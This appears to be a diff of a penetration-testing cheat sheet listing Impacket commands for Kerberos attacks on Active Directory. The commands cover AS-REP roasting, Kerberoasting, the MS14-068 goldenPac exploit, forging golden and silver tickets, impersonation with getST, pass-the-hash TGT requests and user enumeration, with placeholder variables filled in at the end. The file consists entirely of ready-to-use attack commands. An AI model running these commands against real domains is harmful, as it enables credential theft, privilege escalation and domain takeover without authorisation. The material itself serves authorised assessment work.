@@ -3,61 +3,77 @@
 % impacket, windows, kerberos, 88
 
 ## GetNPUsers without password to get TGT (ASREPRoasting)
-#plateform/linux #target/remote #cat/ATTACK/EXPLOIT 
-```
+#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user
+
+```bash
 GetNPUsers.py <domain>/<user> -no-pass -request -format hashcat
 ```
 
 ## GetNPUsers - attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ (ASREPRoasting)
-#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
-```
-GetNPUsers.py -dc-ip <dc_ip> <domain>/ -usersfile <users_file> -format hashcat
+#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user
+
+```bash
+GetNPUsers.py -dc-ip <dc-ip> <domain>/ -usersfile <users_file> -format hashcat
 ```
 
-## GetUSERSPN - find Service Principal Names that are associated with a normal user account (kerberoasting)
-#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
-```
-GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
+## GetUserSPNs - find Service Principal Names that are associated with a normal user account (kerberoasting)
+#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user
+
+```bash
+GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc-ip> -outputfile user_SPN.ticket
 ```
 
 ## MS14-068 - goldenPac
-#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
-```
-goldenPac.py -dc-ip <dc_ip> <domain>/<user>:'<password>'@<target>
+#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user
+
+```bash
+goldenPac.py -dc-ip <dc-ip> <domain>/<user>:'<password>'@<target>
 ```
 
 ## Ticketer - (golden ticket) - generate TGT/TGS tickets into ccache format which can be converted further into kirbi.
-#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
-```
+#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user
+
+```bash
 ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
 ```
 
 ## Ticketer - (silver ticket) - generate TGS tickets into ccache format which can be converted further into kirbi.
-#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
-```
+#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user
+
+```bash
 ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <user>
 ```
 
 ## TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files used by impacket
-#plateform/linux #target/local  #cat/UTILS
-```
+#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user
+
+```bash
 ticketConverter.py <ccache_ticket_file> <ticket_kirbi_file>
 ```
 
 ## Silver ticket - impersonate user
-#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
-```
+#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user
+
+```bash
 getST.py -spn cifs/<target> <domain>/<netbios_name>\$ -impersonate <user>
 ```
 
 ## GetTGT - request a TGT and save it as ccache for given a password, hash or aesKey
-#plateform/linux #target/remote  #cat/UTILS
-```
-getTGT.py -dc-ip <dc_ip> -hashes <lm_hash>:<nt_hash> <domain>/<user>
+#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user
+
+```bash
+getTGT.py -dc-ip <dc-ip> -hashes <lm_hash>:<nt_hash> <domain>/<user>
 ```
 
 ## GetADUser - gather data about the domain’s users and their corresponding email addresses
-#plateform/linux #target/remote  #cat/RECON 
+#assessment/AD #attack_type/Quickwin #port/88 #protocol/kerberos #access/Domain_user
+
+```bash
+GetADUsers.py -all <domain>/<user>:<password> -dc-ip <dc-ip>
 ```
-GetADUsers.py -all <domain>/<user>:<password> -dc-ip <dc_ip>
-```
+
+= ip: 192.168.1.0
+= dc-ip: $DC_IP
+= user: $USER
+= password: $PASSWORD
+= domain: $DOMAIN
